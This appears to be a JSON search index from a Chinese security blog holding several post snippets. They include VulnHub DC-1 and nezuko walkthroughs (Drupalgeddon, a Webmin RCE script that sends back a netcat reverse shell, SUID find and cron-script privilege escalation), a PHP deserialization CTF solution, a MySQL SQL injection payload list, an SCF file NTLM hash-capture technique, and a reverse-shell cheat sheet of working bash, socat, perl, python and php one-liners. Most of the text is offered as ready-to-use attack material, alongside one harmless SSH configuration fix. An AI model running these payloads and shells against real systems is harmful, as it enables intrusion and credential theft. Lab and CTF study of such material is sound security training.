exploit/multi/http/drupal_drupageddonmsf6&gt; set RHOSTS IPmsf6&gt; runpython -c \"import pty;pty.spawn('/bin/bash')\"export TERM=xterm# FLAG 1www-data@DC-1:/var/www$cat /var/www/flag1.txtEvery good CMS needs a config file - and so do you.# 查看settings.php 文件 发现连接数据库密码www-data@DC-1:/var/www$ cat ./sites/default/settings.php# FLAG 2/** * * flag2 * Brute force and dictionary attacks aren't the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupaldb', 'username' =&gt; 'dbuser', 'password' =&gt; 'R0ck3t', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),);在mysql更改admin的密码hash。连接数据库$ mysql -udbuser -pRock3tmysql&gt; use drupaldb;mysql&gt; select * from users;+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+| uid | name | pass | mail | theme | signature | signature_format | created | access | login | status | timezone | language | picture | init | data |+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+| 0 | | | | | | NULL | 0 | 0 | 0 | 0 | NULL | | 0 | | NULL || 1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com | | | NULL | 1550581826 | 1550583852 | 1550582362 | 1 | Australia/Melbourne | | 0 | admin@example.com | b:0; || 2 | Fred | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org | | | filtered_html | 1550581952 | 1550582225 | 1550582225 | 1 | Australia/Melbourne | | 0 | fred@example.org | b:0; |+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+想要破解 admin 的密码,还是非常困难的我们直接修改admin 的密码hash,使其达到和修改密码一样的效果# 注意：不要进入scripts目录，会报错www-data@DC-1:/var/www$ ./scripts/password-hash.sh 123password: 123 \t\thash: $S$DCdv8l/KgmfSu2lQe7MhvdVY76ec3O.3x7xeeAiLE6UEWWf9ApJ7# 再次连接数据库mysql &gt; update users set pass='$S$DCdv8l/KgmfSu2lQe7MhvdVY76ec3O.3x7xeeAiLE6UEWWf9ApJ7' where name='admin';# 这样admin的密码就是123了接下来直接登录Drupal 网站后台发现FALG 3# FALG 3Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.\\``flag4www-data@DC-1:/home/flag4$ cat flag4.txtCan you use this same method to find or access the flag in root?Probably. But perhaps it's not that easy. Or maybe it is?利用设置了 SUID 位的 find 提权www-data@DC-1:/var/www/sites/default$ find / -perm -4000 2&gt;/dev/null/bin/mount/bin/ping/bin/su/bin/ping6/bin/umount/usr/bin/at/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/chfn/usr/bin/gpasswd/usr/bin/procmail/usr/bin/find &lt;--/usr/sbin/exim4/usr/lib/pt_chown/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/sbin/mount.nfswww-data@DC-1:/home/flag4$ find /root -exec /bin/sh \\;# iduid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)# cat thefinalflag.txtWell done!!!!Hopefully you've enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7# END" }, { "title": "VulnHub-nezuko", "url": "/posts/VulnHub-nezuko/", "categories": "vulnhub", "tags": "vulnhub", "date": "2022-02-13 00:00:00 +0800", "snippet": "2022 年 2 月 13 日，星期日Introduction Creator : @yunaranyancat (Twitter) Difficulty : Easy ~ Intermediate OS Used: Ubuntu 18.04 Services : Webmin 1.920, Apache, SSH User : root, zenitsu, nezuko Hashes : at their home directoryTable Of Content nmap base32解密,得到没用的提示 运行searchsploit然后使用 Metasploit 来利用 Webmin 使用john破解在/etc/passwd发现的密码sha512crypt 滥用可写脚本 namp kali IP : 192.168.84.5 $ nmap -sV -p- -sC -oN nmap 192.168.84.8Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-12 22:56 ESTNmap scan report for 192.168.84.8Host is up (0.00042s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)| 256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)|_ 256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Welcome to my site! - nezuko kamado13337/tcp open ssl/http MiniServ 1.920 (Webmin httpd)| http-robots.txt: 1 disallowed entry |_/|_http-title: Login to Webmin| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on ubuntu| Not valid before: 2019-08-20T09:28:46|_Not valid after: 2024-08-18T09:28:46|_ssl-date: TLS randomness does not represent timeMAC Address: 08:00:27:E1:A5:C7 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel base32解密,得到没用的提示 ```bash$ curl http://192.168.84.8/robots.txt | base32 -d hint from nezuko : this is not the right port to enumerate ^w^### 运行searchsploit然后使用 Metasploit 来利用 Webmin在13337端口上运行着Webmin ,版本是1.920```bash$ whatweb https://192.168.84.8:13337https://192.168.84.8:13337 [200 OK] Cookies[redirect,testing], Country[RESERVED][ZZ], HTML5, HTTPServer[MiniServ/1.920],IP[192.168.84.8], PasswordField[pass], Script, Title[Login to Webmin], UncommonHeaders[auth-type,content-security-policy], X-Frame-Options[SAMEORIGIN]# MiniServ/1.920使用 searchsploit 搜索相关漏洞$ searchsploit Webmin 1.920# linux/webapps/47293.sh$ ./47293.sh https://192.168.84.8:13337Testing for RCE (CVE-2019-15107) on https://192.168.84.8:13337: VULNERABLE!漏洞是存在的接下来就是反弹一个shell$ nc -lvp 1234# 先在kali监听1234端口exp.sh 的内容URI=$1;exp='nc 192.168.84.5 1234 -e /bin/bash';curl -ks $URI'/password_change.cgi' -d \"user=wheel&amp;pam=&amp;expired=2&amp;old=$exp&amp;new1=wheel&amp;new2=wheel\" -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H \"Content-Type: application/x-www-form-urlencoded\" -H 'Referer: '$URI'/session_login.cgi'运行 exp.sh,然后监听的那边就返回了一个shell$ ./exp.sh https://192.168.84.8:13337使用john破解在/etc/passwd发现的密码sha512crypt进入系统后,查看/etc/passwd,发现zenitsu 密码 shazenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash破解，得到密码. zenitsu:menwmeow$ cat hash $6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0$ john hash meowmeow (?)滥用可写脚本zenitsu@ubuntu:~/to_nezuko$ pwd/home/zenitsu/to_nezukozenitsu@ubuntu:~/to_nezuko$ lssend_message_to_nezuko.shzenitsu@ubuntu:~/to_nezuko$# root 每 5 分钟运行一次send_message_to_nezuko.sh$ echo \"echo root:123|chpasswd\" &gt;&gt; send_message_to_nezuko.sh# 等待5分钟后 root 的密码就是 123$ su rootpassword: 123# cat root.txtCongratulations on getting the root shell!Tell me what do you think about this box at my twitter, @yunaranyancatca33b8158d9dee5c35a7d6d793c7fd5$end$" }, { "title": "ZJCTF2019-NiZhuanSiWei", "url": "/posts/CTF-Web-ZJCTF2019-NiZhuanSiWei/", "categories": "CTF, Web", "tags": "PHP-Code-Audit", "date": "2022-01-03 00:00:00 +0800", "snippet": "页面源码&lt;?php$text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\")){ \techo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; \tif(preg_match(\"/flag/\",$file)){ \t\techo \"Not now!\";\t\texit();\t}else{ \t\tinclude($file); //useless.php\t\t$password = unserialize($password); \t\techo $password; \t} } else{ highlight_file(__FILE__); } ?&gt;进入if 判断需要一个公网主机，$ ip a100.x.x.56$ echo -n \"welcome to the zjctf\" &gt; index.html$ php -S 0:80访问 http://100.x.x.56/index.html页面内容 welcome to the zjctfhttp://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html页面返回&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;/h1&gt;&lt;/br&gt;下面这行代码反序列化，应该需要配合useless.php里的类进行反序列化漏洞利用include($file); //useless.php$password = unserialize($password);利用php://filter 读取源码http://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html&amp;file=php://filter/read=convert.base64-encode/resource=useless.phpPD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=base64 解密&lt;?phpclass Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } }}?&gt;根据 useless.php的代码构造exp&lt;?phpclass Flag{ public $file='flag.php';}$obj=new Flag();echo serialize($obj);?&gt;运行代码$ php exp.php，得到O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}将结果传给passwordhttp://34f7d9d3-6ac7-4ae2-9a5d-807e61559a10.node4.buuoj.cn:81/?text=http://100.x.x.56/index.html&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}得到&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;/h1&gt;&lt;/br&gt;&lt;br&gt;oh u find it &lt;/br&gt; &lt;!--but i cant give it to u now--&gt; &lt;?php if(2===3){return (\"flag{858c4f33-1368-464a-bd7f-6c3e7b318917}\");} ?&gt;&lt;br&gt;U R SO CLOSE !///COME ON PLZ" }, { "title": "ssh-no-matching-key-exchange-method-found", "url": "/posts/Misc-ssh-nmkemf/", "categories": "Misc", "tags": "Misc", "date": "2022-01-02 00:00:00 +0800", "snippet": " 2022年4月19日,星期二解决ssh连接时出现以下类似的错误–root@CLw0rm:~# ssh root@172.16.1.55Unable to negotiate with 172.16.1.55 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1方法1:在当前用户的.ssh目录下新建config文件,只对当前用户生效;$ vim ~/.ssh/config添加以下内容:Host *KexAlgorithms +diffie-hellman-group1-sha1方法1:修改/etc/ssh/ssh_config文件;$ vim /etc/ssh/ssh_config在文件ssh配置文件末尾添加以下内容,全不用户生效.KexAlgorithms +diffie-hellman-group1-sha1" }, { "title": "Misc-sql-injection", "url": "/posts/Misc-sql-injection/", "categories": "Misc", "tags": "Misc", "date": "2022-01-02 00:00:00 +0800", "snippet": "基于mysql的一些sql注入payloadsql注入注释#-- ---+-/*xx*/mysql查询select schema_name from information_schema.schemata;select table_name from information_schema.tables;select table_name from information_schema.tables where table_schema=database();select column_name from information_schema.columns;select column_name from information_schema.columns where table_schema=database();select column_name from information_schema.columns where table_name='user';select column_name from information_schema.columns where table_name='user' and table_schema=database();常用判断注入方法1' or '1'='11' or '1'='1'1' or '1'='1'--' or 1=1 --a' or 1=1 --\" or 1=1 --a\" or 1=1 --' or 1=1 #\" or 1=1 #or 1=1 --' or 'x'='x\" or \"x\"=\"x') or ('x'='x\") or (\"x\"=\"x# 使用时间延迟查找可注入参数';WAITFOR DELAY '0:0:5'--判断字段 order by 1 order by 2 order by 3... union select 1 union select 1,2 union select 1,2,3 union select 1,2,3,4 union select 1 from xxx union select 1,2 from xxx union select 1,2,3 from xxx联合查询注入'1' order by 2--+-'1' union select 1,2--+-# 查询当前数据库的表'1' union select 1,table_name from information_schema.tables where table_schema=database()--+-'1' union select 1,concat(table_name) from information_schema.tables where table_schema=database()--+-'1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+-# 查询users表内的字段'1' union select 1,column_name from information_schema.columns where table_name='users'--+-'1' union select 1,concat(column_name) from information_schema.columns where table_name='users'--+-'1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'--+-# 也可以为16进制'1' union select 1,column_name from information_schema.columns where table_name=0x7573657273--+-# 查数据'1' union select user_id,password from users--+-'1' union select user,group_concat(user_id,password) from users--+-select(group_concat(user_id,password))from(users);select(group_concat(user_id,password))from(users)where(user_id=1);报错注入报错注入需要使用到的函数 ExtractValue() 和 updatexml()# 报错获取当前数据库'1' and updatexml(1,concat(0x5e,(database()),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select(database())),0x5e),1)--+-'1' and extractvalue(1,concat(0x5e,(select database()),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select(database())),0x5e))--+-# 报错注入有些也可以使用^'1'^updatexml(1,concat(0x5e,(database()),0x5e),1)--+-'1'^updatexml(1,concat(0x5e,(select(database())),0x5e),1)--+-'1'^extractvalue(1,concat(0x5e,(select database()),0x5e))--+-'1'^extractvalue(1,concat(0x5e,(select(database())),0x5e))--+-# 获取tables 表# 如果出现 回显'ubquery returns more than 1 row' 字样，就需要使用 limit来分页，或者使用group_concat()'1' and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e),1)--+-'1'^updatexml(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e),1)--+-'1' and extractvalue(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database()),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e))--+-'1'^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e))--+-# 获取表的字段'1' and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select concat(column_name) from information_schema.columns where table_name='users' limit 1,1),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x5e),1)--+-# concat只能存32个，'1' and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,30),0x5e),1)--+-'1' and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),31,60),0x5e),1)--+-# 获取数据'1' and extractvalue(1,concat(0x5e,(select id from users),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select(id)from(users)),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select(id)from(users)limit 1),0x5e))--+-'1' and extractvalue(1,concat(0x5e,(select(id)from(users)limit 1,1),0x5e))--+-代替空格# 空格代替%09 TAB键（水平）%0a 新建一行,回车%0b TAB键（垂直）%0c 新的一页%0d return功能%a0 (window部分无法实现)%27 单引号/**/tab两个空格%0A 大小写# %09'1'%09or%091=1--+-'1'%09and%091=1--+-# %0a'1'%0aor%0a1=1--+-'1'%0aand%0a1=1--+-# %0d'1'%0dor%0d1=1--+-'1'%0dand%0d1=1--+-# %0c'1'%0cor%0c1=1--+-'1'%0cand%0c1=1--+-# %0b'1'%0bor%0b1=1--+-'1'%0band%0b1=1--+-# /*a*/'1'/*a*/or/*a*/1=1--+-'1'/*a*/and/*a*/1=1--+-if sleep注入(时间盲注) 判断正确的时候会立即返回，判断错误的时候会延迟5秒判断长度:# 不延迟'1' and if(length(database())&gt;1,0,sleep(5))--+-'1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;1,0,sleep(5))--+-# 延迟'1' and if(length(database())&lt;1,0,sleep(5))--+-'1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&lt;1,0,sleep(5))--+-" }, { "title": "SMB 共享 – SCF 文件攻击", "url": "/posts/Misc-SMB-Share-SCF-File-Attack/", "categories": "Misc", "tags": "Misc", "date": "2022-01-02 00:00:00 +0800", "snippet": "https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/SMB 是一种在组织中广泛用于文件共享目的的协议。在内部渗透测试期间，发现包含敏感信息（如纯文本密码和数据库连接字符串）的文件共享并不罕见。但是，即使文件共享不包含任何可用于连接到其他系统的数据，但为未经身份验证的用户配置了写入权限，也可以获取域用户或Meterpreter shell的密码哈希。收集哈希SCF（Shell 命令文件）文件可用于执行一组有限的操作（如显示 Windows 桌面或打开 Windows 资源管理器）并不是什么新鲜事。但是，SCF文件可用于访问特定的UNC路径，该路径允许渗透测试人员构建攻击。下面的代码可以放在一个文本文件中，然后需要将其植入网络共享中。[Shell]Command=2IconFile=\\\\X.X.X.X\\share\\pentestlab.ico[Taskbar]Command=ToggleDesktop将文件另存为 SCF 文件将使该文件在用户浏览文件时执行。在文件名前面添加 @ 符号会将 pentestlab.scf 放在共享驱动器的顶部。需要使用以下参数执行响应程序，以捕获将浏览共享的用户的哈希。$ responder -wrf --lm -v -I eth0当用户浏览共享时，将自动建立从其系统到 SCF 文件中包含的 UNC 路径的连接。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。在该身份验证过程中，随机的 8 字节质询密钥从服务器发送到客户端，并使用此质询密钥再次对散列的 NTLM/LANMAN 密码进行加密。响应程序将捕获 NTLMv2 哈希。与Responder相反，Metasploit Framework有一个模块，可用于从SMB客户端捕获质询 - 响应密码哈希。auxiliary/server/capture/smb结论这种技术利用了所有网络中真正常见的东西，如共享，以便检索密码哈希并获取meterpreter shell。唯一的要求是用户需要浏览包含恶意 SCF 文件的共享。但是，可以通过执行以下操作来防止这些攻击： 使用 Kerberos 身份验证和 SMB 签名 不允许未经身份验证的用户在文件共享中具有写入权限 确保使用 NTLMv2 密码哈希而不是 LanMan" }, { "title": "Misc-Reverse-Shell-Cheat-Sheet", "url": "/posts/Misc-Reverse_Shell/", "categories": "Misc", "tags": "Misc", "date": "2022-01-02 00:00:00 +0800", "snippet": "Summary Reverse Shell Awk Automatic Reverse Shell Generator Bash TCP Bash UDP C Dart Golang Groovy Alternative 1 Groovy Java Alternative 1 Java Alternative 2 Java Lua Ncat Netcat OpenBsd Netcat BusyBox Netcat Traditional NodeJS OpenSSL Perl PHP Powershell Python Ruby Socat Telnet War Meterpreter Shell Windows Staged reverse TCP Windows Stageless reverse TCP Linux Staged reverse TCP Linux Stageless reverse TCP Other platforms Spawn TTY Shell ReferencesReverse ShellBash TCPbash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1Bash UDPVictim:sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1Listener:nc -u -lvp 4242Don’t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bashSocatuser@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242Static socat binary can be found at https://github.com/andrew-d/static-binariesPerlperl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'NOTE: Windows onlyperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'PythonLinux onlyIPv4export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'IPv4 (No Spaces)python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'IPv4 (No Spaces, Shortened)python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'IPv4 (No Spaces, Shortened Further)python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'IPv6python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'IPv6 (No Spaces)python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'IPv6 (No Spaces, Shortened)python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'Windows onlyC:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"PHPphp -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'php -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'php -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'php -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'php -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'php -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\", \"r\");'php -r 